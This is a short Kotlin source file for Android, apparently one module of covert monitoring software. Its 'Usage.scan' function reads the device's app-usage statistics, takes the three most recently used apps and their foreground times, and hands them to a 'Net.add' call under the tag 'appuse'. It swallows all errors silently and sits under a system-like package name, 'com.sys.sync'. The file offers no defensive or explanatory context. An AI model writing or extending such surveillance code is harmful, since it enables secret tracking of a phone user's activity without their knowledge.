package com.sys.sync

import android.app.usage.UsageStatsManager
import android.content.Context

object Usage {
    fun scan(c: Context) {
        try {
            val usm = c.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val end = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, end - 60000, end) ?: return
            stats.sortedByDescending { it.lastTimeUsed }.take(3).forEach {
                Net.add("appuse", it.packageName, null, it.totalTimeInForeground.toString())
            }
        } catch (_: Exception) {}
    }
}
